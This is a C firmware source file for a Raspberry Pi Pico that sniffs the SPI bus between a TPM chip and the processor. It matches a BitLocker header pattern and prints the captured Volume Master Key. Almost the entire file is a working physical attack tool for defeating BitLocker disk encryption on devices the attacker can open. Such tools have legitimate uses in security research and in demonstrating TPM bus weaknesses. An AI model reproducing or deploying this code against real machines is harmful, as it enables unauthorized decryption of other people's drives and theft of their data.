#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include "pico/stdlib.h"
#include "pico/multicore.h"
#include "hardware/pio.h"
#include "hardware/dma.h"

// PIO program
#include "spi_sniffer.pio.h"

static const uint8_t vmk_header[] = {
    // VMK header: 2c0000000100000003200000
    0x2c, 0x00, 0x00, 0x0, 0x01, 0x00, 0x00, 0x00, 0x03, 0x20, 0x00, 0x00
};

static const uint8_t vmk_footer[] = {
    0x00, 0x20
};

uint8_t message_buffer[8192];
volatile size_t msg_buffer_end_idx = 0;

void dma_setup(PIO pio, uint sm, uint dma_chan, uint32_t *capture_buf, size_t capture_size_words) {
    dma_channel_config c = dma_channel_get_default_config(dma_chan);
    channel_config_set_read_increment(&c, false);
    channel_config_set_write_increment(&c, true);
    channel_config_set_dreq(&c, pio_get_dreq(pio, sm, false));

    dma_channel_configure(dma_chan, &c,
        capture_buf,        // Destination pointer
        &pio->rxf[sm],      // Source pointer
        capture_size_words, // Number of transfers
        false               // Do not start immediately
    );
}

void push_to_core0(uint8_t data) {
    message_buffer[msg_buffer_end_idx++] = data;
    if (data == vmk_header[0]) {
        multicore_fifo_push_blocking(msg_buffer_end_idx);
    }
}

void core1_main() {
    // 18 MISO          blue
    // 19 MOSI (unused) red
    // 20 CLK           yellow
    // 21 CSn           green
    uint debug_pin = 16;
    uint pin_base = 18;
    
    PIO pio = pio0;
    uint offset = pio_add_program(pio, &spi_sniffer_program);
    uint sm = pio_claim_unused_sm(pio, true);

    spi_sniffer_program_init(pio, sm, offset, pin_base, debug_pin);



    // We're going to capture into a u32 buffer, for best DMA efficiency.
    uint32_t TOTAL_SAMPLE_BITS = 512;
    uint32_t BUF_SIZE_WORDS = TOTAL_SAMPLE_BITS / 32;
    const uint32_t TOTAL_DMA_CHAN = 2;
    const uint32_t processing_capture_buf_uint8_size = TOTAL_SAMPLE_BITS / sizeof(uint8_t);

    uint32_t *capture_buf[TOTAL_DMA_CHAN] = {};
    capture_buf[0] = malloc(BUF_SIZE_WORDS * sizeof(uint32_t));
    hard_assert(capture_buf[0]);
    capture_buf[1] = malloc(BUF_SIZE_WORDS * sizeof(uint32_t));
    hard_assert(capture_buf[1]);

    // start SM
    pio_sm_set_enabled(pio, sm, true);

    printf("init ok\n");

    int processing_capture_buf_id = 1;
    dma_setup(pio, sm, 0, capture_buf[0], BUF_SIZE_WORDS);
    dma_channel_start(0);

    int c = 0;
    int d = 0;

    int next_tpm_msg_value = 0;

    while (1) {
        int old_processing_capture_buf_id = processing_capture_buf_id;
        
        processing_capture_buf_id = (processing_capture_buf_id + 1) % TOTAL_DMA_CHAN;
        uint32_t* processing_capture_buf = capture_buf[processing_capture_buf_id];
        dma_channel_wait_for_finish_blocking(processing_capture_buf_id);

        dma_setup(pio, sm, old_processing_capture_buf_id, capture_buf[old_processing_capture_buf_id], BUF_SIZE_WORDS);
        dma_channel_start(old_processing_capture_buf_id);

        if (next_tpm_msg_value) {
            push_to_core0(processing_capture_buf[0]);
            next_tpm_msg_value = 0;
        }

        for (int i = 0; i < BUF_SIZE_WORDS; i++) {
            c++;
            
            if (d == 0) {
                if (processing_capture_buf[i] == 0xff534644) {
                    printf("Power ON:%d\n", c);
                    d++;
                }
            }

            // Pattern 1: 80 00 00 00 01 xx
            // Pattern 2: 80 00 00 00 xx
            if (processing_capture_buf[i] == 0x80000000) {
                
                if ((processing_capture_buf[i+1] & 0xffffff00) != 0x0100 && 
                    (processing_capture_buf[i+1] & 0xffffff00) != 0x0000) {
                    continue;
                }
                
                if (i + 1 == BUF_SIZE_WORDS) {
                    next_tpm_msg_value = 1;
                    continue;
                }

                push_to_core0(processing_capture_buf[i+1] & 0x000000ff);
            }

        }
    }
}


int main() {

    // setup led as power indicator
    const uint LED_PIN = PICO_DEFAULT_LED_PIN;
    gpio_init(LED_PIN);
    gpio_set_dir(LED_PIN, GPIO_OUT);
    gpio_put(LED_PIN, 1);
    sleep_ms(250);
    gpio_put(LED_PIN, 0);
    sleep_ms(250);
    gpio_put(LED_PIN, 1);
    
    // https://forums.raspberrypi.com/viewtopic.php?t=301902
    set_sys_clock_khz(270000, true); // 158us

    printf("> Bitlocker TPM sniff (SPI) <\n");
    printf("Loading...\n");

    stdio_init_all();
    multicore_launch_core1(core1_main);

    while (true) {
        uint32_t popped_idx = multicore_fifo_pop_blocking();

        // Wait until buffer full
        // Header + VMK size = 44, + 2 STS
        while((msg_buffer_end_idx - popped_idx) < 44 + 2) {
        }
        
        if(memcmp(message_buffer + popped_idx, vmk_header, 5) == 0) {
            printf("! Bitlocker VMK found:\n");

            // TODO: get rid of STS
            for (int k = 0; k <= 32; k += 2) {
                printf("%02X", message_buffer[popped_idx + 12 + k]);
                printf("%02X ", message_buffer[popped_idx + 12 + k + 1]);
            }
        }
    }
}
